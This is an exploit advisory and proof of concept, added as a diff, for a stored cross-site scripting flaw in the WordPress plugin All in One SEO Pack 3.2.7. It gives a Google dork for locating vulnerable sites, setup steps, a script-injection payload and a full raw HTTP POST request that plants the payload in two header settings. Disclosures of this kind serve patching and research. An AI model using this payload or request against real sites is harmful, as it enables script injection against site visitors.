@@ -1,0 +1,56 @@
+# Exploit Title: all-in-one-seo-pack 3.2.7 - Persistent Cross-Site Scripting
+# Google Dork: inurl:"\wp-content\plugins\all-in-one-seo-pack"
+# Date: 2019-06-13
+# Exploit Author: Unk9vvN
+# Vendor Homepage: https://semperplugins.com/all-in-one-seo-pack-pro-version
+# Software Link: https://wordpress.org/plugins/all-in-one-seo-pack/
+# Version: 3.2.7
+# Tested on: Windows 10
+# CVE: N/A
+
+# Description
+# This vulnerability is in the validation mode and is located in  the all-in-one-seo-pack tab inside the  and the vulnerability type is stored . the vulnerability parameters are as follows.
+
+1.Go to the 'all-in-one-seo-pack' tab
+2.Select 'general settings' section 
+3.Enter the payload in "Additional Front Page Headers","Additional Posts Page Headers" section
+4.Click the "Update Options" option
+4.Your payload will run on visit page
+
+
+# URI: http://localhost/wordpress/wp-admin/admin.php?page=all-in-one-seo-pack
+# Payload: "><script>alert(1)</script>
+
+#
+# PoC
+#
+POST /wordpress/wp-admin/admin.php?page=all-in-one-seo-pack%2Faioseop_class.php HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://localhost/wordpress/wp-admin/admin.php?page=all-in-one-seo-pack%2Faioseop_class.php
+Content-Type: multipart/form-data; boundary=---------------------------24442753012045
+Content-Length: 8625
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+-----------------------------24442753012045
+Content-Disposition: form-data; name="aiosp_front_meta_tags"
+
+"><script>alert(1)</script>
+-----------------------------24442753012045
+Content-Disposition: form-data; name="aiosp_home_meta_tags"
+
+"><script>alert(1)</script>
+-----------------------------24442753012045
+
+Content-Disposition: form-data; name="Submit"
+
+Update Options Â»
+-----------------------------24442753012045--
+
+
+# Discovered by:
+https://unk9vvn.com
